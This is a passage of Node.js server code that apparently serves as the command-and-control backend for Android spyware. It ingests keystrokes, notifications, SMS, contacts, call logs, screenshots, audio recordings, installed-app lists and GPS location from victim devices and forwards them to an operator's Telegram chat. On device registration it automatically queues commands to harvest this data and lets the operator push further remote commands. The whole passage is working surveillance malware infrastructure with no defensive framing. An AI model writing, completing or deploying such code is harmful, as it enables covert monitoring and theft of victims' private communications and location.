        }, 60000);
        
        res.json({ success: true, filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ File upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// ============= LOG INGESTION ENDPOINTS =============

/**
 * Endpoint for devices to send logs in real-time
 * Expects POST with JSON body containing log entries
 */
app.post('/api/logs', async (req, res) => {
    try {
        const logData = req.body;
        
        console.log(`📝 Log received:`, {
            type: logData.type,
            deviceId: logData.deviceId,
            timestamp: new Date(logData.timestamp).toISOString(),
            package: logData.package
        });

        // Validate required fields
        if (!logData.deviceId) {
            console.error('❌ Missing deviceId in log');
            return res.status(400).json({ error: 'Missing deviceId' });
        }

        // Find the device
        const device = devices.get(logData.deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${logData.deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }

        const chatId = device.chatId;

        // Format log for Telegram based on type
        let message = '';
        
        switch (logData.type) {
            case 'keystroke':
                message = `⌨️ <b>Keystroke</b>\n` +
                         `App: <code>${logData.package || 'unknown'}</code>\n` +
                         `Text: <code>${logData.data?.substring(0, 100)}</code>`;
                break;
                
            case 'notification':
                message = `🔔 <b>Notification</b>\n` +
                         `App: <code>${logData.package || 'unknown'}</code>\n` +
                         `Title: <b>${logData.title || ''}</b>\n` +
                         `Content: <code>${logData.data?.substring(0, 100)}</code>`;
                break;
                
            case 'location':
                // Location is handled by /api/location endpoint
                // Just acknowledge
                return res.json({ success: true, handled: 'location_endpoint' });
                
            case 'ip_info':
                // IP info is handled by /api/ipinfo endpoint
                return res.json({ success: true, handled: 'ipinfo_endpoint' });
                
            case 'phone_number':
                // Phone number is handled by /api/phonenumber endpoint
                return res.json({ success: true, handled: 'phonenumber_endpoint' });
                
            case 'contacts':
                try {
                    const contacts = JSON.parse(logData.data || '[]');
                    message = `📇 <b>Contacts Update</b>\n` +
                             `Total contacts: ${contacts.length}`;
                } catch (e) {
                    message = `📇 <b>Contacts Update</b>\n` +
                             `Data: ${logData.data?.substring(0, 100)}`;
                }
                break;
                
            case 'call_logs':
                try {
                    const calls = JSON.parse(logData.data || '[]');
                    message = `📞 <b>Call Logs Update</b>\n` +
                             `Total calls: ${calls.length}`;
                } catch (e) {
                    message = `📞 <b>Call Logs Update</b>\n` +
                             `Data: ${logData.data?.substring(0, 100)}`;
                }
                break;
                
            case 'sms':
                try {
                    const sms = JSON.parse(logData.data || '[]');
                    message = `💬 <b>SMS Update</b>\n` +
                             `Total messages: ${sms.length}`;
                } catch (e) {
                    message = `💬 <b>SMS Update</b>\n` +
                             `Data: ${logData.data?.substring(0, 100)}`;
                }
                break;
                
            case 'screenshot':
                message = `📸 <b>Screenshot Taken</b>\n` +
                         `Size: ${logData.size ? (logData.size/1024).toFixed(2) + 'KB' : 'unknown'}\n` +
                         `Quality: ${logData.quality || 'unknown'}%`;
                break;
                
            case 'recording':
                message = `🎤 <b>Recording Saved</b>\n` +
                         `Duration: ${logData.duration || 'unknown'}s\n` +
                         `Size: ${logData.size ? (logData.size/1024/1024).toFixed(2) + 'MB' : 'unknown'}`;
                break;
                
            case 'installed_apps':
                try {
                    const apps = JSON.parse(logData.data || '[]');
                    message = `📱 <b>Apps List Update</b>\n` +
                             `Total apps: ${apps.length}`;
                } catch (e) {
                    message = `📱 <b>Apps List Update</b>\n` +
                             `Data: ${logData.data?.substring(0, 100)}`;
                }
                break;
                
            case 'device_info':
                try {
                    const info = JSON.parse(logData.data || '{}');
                    message = `📱 <b>Device Info Update</b>\n` +
                             `Model: ${info.model || 'unknown'}\n` +
                             `Android: ${info.androidVersion || 'unknown'}\n` +
                             `Manufacturer: ${info.manufacturer || 'unknown'}`;
                } catch (e) {
                    message = `📱 <b>Device Info Update</b>\n` +
                             `Data: ${logData.data?.substring(0, 100)}`;
                }
                break;
                
            default:
                message = `📝 <b>Log: ${logData.type}</b>\n` +
                         `Data: ${logData.data?.substring(0, 200)}`;
        }

        // Send to Telegram if we have a message
        if (message) {
            // Don't await - don't block the response
            sendTelegramMessage(chatId, message).catch(e => 
                console.error('Failed to send log to Telegram:', e)
            );
        }

        // Log to console for debugging
        console.log(`✅ Log processed for device ${logData.deviceId}`);

        // Send success response
        res.json({ 
            success: true, 
            timestamp: Date.now(),
            message: 'Log received'
        });

    } catch (error) {
        console.error('❌ Error processing log:', error);
        res.status(500).json({ 
            error: 'Failed to process log',
            message: error.message 
        });
    }
});

// Also add a plural version for compatibility
app.post('/api/log', (req, res) => {
    // Redirect to /api/logs
    console.log('📝 Redirecting /api/log to /api/logs');
    req.url = '/api/logs';
    app._router.handle(req, res);
});

/**
 * Endpoint for batch log uploads
 * Expects array of log entries
 */
app.post('/api/logs/batch', async (req, res) => {
    try {
        const logs = req.body;
        
        if (!Array.isArray(logs)) {
            return res.status(400).json({ error: 'Expected array of logs' });
        }

        console.log(`📦 Received batch of ${logs.length} logs`);

        // Group logs by device
        const deviceLogs = new Map();
        
        for (const log of logs) {
            if (log.deviceId) {
                if (!deviceLogs.has(log.deviceId)) {
                    deviceLogs.set(log.deviceId, []);
                }
                deviceLogs.get(log.deviceId).push(log);
            }
        }

        // Send summary to each device's chat
        for (const [deviceId, deviceLogsList] of deviceLogs.entries()) {
            const device = devices.get(deviceId);
            if (device) {
                // Count by type
                const typeCounts = {};
                deviceLogsList.forEach(log => {
                    typeCounts[log.type] = (typeCounts[log.type] || 0) + 1;
                });
                
                const typeSummary = Object.entries(typeCounts)
                    .map(([type, count]) => `• ${type}: ${count}`)
                    .join('\n');
                
                const summary = `📊 <b>Log Batch Summary</b>\n` +
                    `Received ${deviceLogsList.length} logs:\n` +
                    `${typeSummary}\n\n` +
                    `First log: ${new Date(deviceLogsList[0].timestamp).toLocaleString()}\n` +
                    `Last log: ${new Date(deviceLogsList[deviceLogsList.length-1].timestamp).toLocaleString()}`;
                
                // Send summary without awaiting
                sendTelegramMessage(device.chatId, summary).catch(console.error);
            }
        }

        res.json({ 
            success: true, 
            processed: logs.length,
            devices: deviceLogs.size
        });

    } catch (error) {
        console.error('❌ Error processing batch logs:', error);
        res.status(500).json({ 
            error: 'Failed to process batch logs',
            message: error.message 
        });
    }
});

// ============= LOCATION ENDPOINT =============

app.post('/api/location/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const locationData = req.body;
        
        console.log(`📍 Location data from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        // Store last location in device data
        device.lastLocation = locationData;
        
        // Format the location message
        const formatted = formatLocationMessage(locationData);
        
        if (formatted.lat && formatted.lon) {
            // Send as native Telegram location (creates a pin)
            try {
                await axios.post(`${TELEGRAM_API}/sendLocation`, {
                    chat_id: chatId,
                    latitude: formatted.lat,
                    longitude: formatted.lon,
                    live_period: 60
                });
                console.log('✅ Location pin sent');
            } catch (e) {
                console.error('Failed to send location pin:', e.message);
            }
        }
        
        // Send the formatted message
        await sendTelegramMessage(chatId, formatted.text);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Location endpoint error:', error);
        res.status(500).json({ error: 'Location processing failed' });
    }
});

// ============= API ENDPOINTS =============

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        authorizedChats: Array.from(authorizedChats).join(', '),
        serverIP: getServerIP(),
        timestamp: Date.now()
    });
});

app.get('/api/ping/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = Date.now();
        res.json({ status: 'alive', timestamp: Date.now() });
    } else {
        res.status(404).json({ status: 'unknown' });
    }
});

app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    try {
        if (device?.pendingCommands?.length > 0) {
            const commands = device.pendingCommands.map(cmd => ({
                command: cmd.command,
                originalCommand: cmd.originalCommand,
                messageId: cmd.messageId,
                timestamp: cmd.timestamp,
                autoData: cmd.autoData || false
            }));
            device.pendingCommands = [];
            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands.map(c => c.command).join(', '));
            sendJsonResponse(res, { commands });
        } else {
            console.log(`📭 No commands for ${deviceId}`);
            sendJsonResponse(res, { commands: [] });
        }
    } catch (e) {
        console.error('Error in /api/commands:', e);
        sendJsonResponse(res, { commands: [], error: e.message }, 500);
    }
});

app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    // Skip if this is a file command
    if (command && (command.includes('_txt') || command.includes('_html') || command === 'ip_info' || command === 'phone_number' || command === 'location')) {
        console.log(`📎 ${command} using dedicated endpoint`);
        return res.sendStatus(200);
    }
    
    console.log(`📨 Result from ${deviceId}:`, { command });
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        
        if (error) {
            await sendTelegramMessage(chatId, `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
        } else {
            await sendTelegramMessage(chatId, result || `✅ ${command} executed`);
        }
    }
    
    res.sendStatus(200);
});

app.post('/api/register', async (req, res) => {
    const { deviceId, chatId, deviceInfo } = req.body;
    
    console.log('📝 Registration attempt:', { deviceId, chatId });
    
    if (!deviceId || !chatId || !deviceInfo) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    
    if (!isAuthorizedChat(chatId)) {
        console.log(`⛔ Unauthorized registration from chat: ${chatId}`);
        return res.status(403).json({ error: 'Chat ID not authorized' });
    }
    
    const deviceData = {
        chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: []
    };
    
    devices.set(deviceId, deviceData);
    
    console.log(`✅ Device registered: ${deviceId} for chat ${chatId}`);
    
    // Set menu button for this chat
    await setChatMenuButton(chatId);
    
    // Send welcome message with keyboard
    await sendTelegramMessageWithKeyboard(
        chatId,
        `✅ <b>Device Connected!</b>\n\n` +
        `Model: ${deviceInfo.model}\n` +
        `Android: ${deviceInfo.android}\n\n` +
        `🔄 <b>Auto-collecting data...</b>\n` +
        `The server is automatically requesting:\n` +
        `• 🌐 IP Address Information\n` +
        `• 📞 Phone Number\n` +
        `• 📇 Contacts\n` +
        `• 💬 SMS Messages\n` +
        `• 📞 Call Logs\n` +
        `• 📱 Installed Apps\n` +
        `• 📍 Location\n\n` +
        `This may take a few moments as the device processes each request.`,
        getMainMenuKeyboard()
    );
    
    // Queue auto-data commands
    queueAutoDataCommands(deviceId, chatId);
    
    res.json({ status: 'registered', deviceId });
});

app.get('/api/devices', (req, res) => {
    const deviceList = [];
    for (const [id, device] of devices.entries()) {
        deviceList.push({
            deviceId: id,
            chatId: device.chatId,
            lastSeen: new Date(device.lastSeen).toISOString(),
            model: device.deviceInfo?.model || 'Unknown',
            android: device.deviceInfo?.android || 'Unknown',
            phoneNumber: device.phoneNumber || 'Not available',
            lastIPInfo: device.lastIPInfo || null,
            lastLocation: device.lastLocation || null,
            autoDataRequested: autoDataRequested.has(id)
        });
    }
    res.json({ total: devices.size, devices: deviceList });
});

// Test endpoint to manually add a command
app.post('/api/test-command/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const { command } = req.body;
    
    const device = devices.get(deviceId);
    
    if (!device) {
        return res.status(404).json({ error: 'Device not found' });
    }
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const cmd = command || 'status';
    device.pendingCommands.push({
        command: cmd,
        originalCommand: '/' + cmd,
        timestamp: Date.now()
    });
    
    console.log(`🧪 Test command added for ${deviceId}: ${cmd}`);
    res.json({ success: true, message: `Test command '${cmd}' added` });
});

// ============= TEST ENDPOINTS =============

app.get('/test', (req, res) => {
    const serverIP = getServerIP();
    res.send(`
        <html>
        <body style="font-family: Arial; padding: 20px;">
            <h1 style="color: #4CAF50;">✅ Server Running</h1>
            <p><b>Time:</b> ${new Date().toISOString()}</p>
            <p><b>Server IP:</b> <code>${serverIP}</code></p>
            <p><b>Devices:</b> ${devices.size}</p>
            <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
            <p><b>Registered Devices:</b></p>
            <ul>
                ${Array.from(devices.entries()).map(([id, device]) => 
                    `<li><b>${id}</b> - ${device.deviceInfo?.model}<br>
                     📞 Phone: ${device.phoneNumber || 'Not available'}<br>
                     Last seen: ${new Date(device.lastSeen).toLocaleString()}</li>`
                ).join('')}
            </ul>
            <p><a href="/test-menu" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Menu</a></p>
        </body>
        </html>
    `);
});

app.get('/test-menu', async (req, res) => {
    const chatId = '5326373447';
    const result = await sendTelegramMessageWithKeyboard(
        chatId,
        "🤖 Test Menu - Use the buttons below:",
        getMainMenuKeyboard()
    );
    res.json({ success: !!result });
});

// ============= START SERVER =============

app.listen(PORT, '0.0.0.0', () => {
    const serverIP = getServerIP();
    console.log('\n🚀 ===============================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🚀 Server IP: ${serverIP}`);
    console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
    console.log('\n✅ AUTO-DATA COLLECTION ENABLED:');
    console.log('   └─ When device registers:');
    console.log('   └─ 1. 🌐 IP Address Info');
    console.log('   └─ 2. 📞 Phone Number');
    console.log('   └─ 3. 📇 Contacts (HTML)');
    console.log('   └─ 4. 💬 SMS (HTML)');
    console.log('   └─ 5. 📞 Call Logs (HTML)');
    console.log('   └─ 6. 📱 Apps List (HTML)');
    console.log('   └─ 7. 📍 Location');
    console.log('\n✅ NEW ENDPOINTS:');
    console.log('   └─ POST /api/ipinfo/:deviceId - IP Information');
    console.log('   └─ POST /api/phonenumber/:deviceId - Phone Number');
    console.log('\n✅ MENU BUTTON CONFIGURED:');
    console.log('   └─ Persistent menu button appears next to input field');
    console.log('   └─ 16 commands registered with BotFather');
    console.log('\n✅ INTERACTIVE SCHEDULE SETUP:');
    console.log('   └─ Step-by-step time entry');
    console.log('   └─ Daily/Once choice with buttons');
    console.log('   └─ Interval validation');
    console.log('\n🚀 ===============================================\n');
});
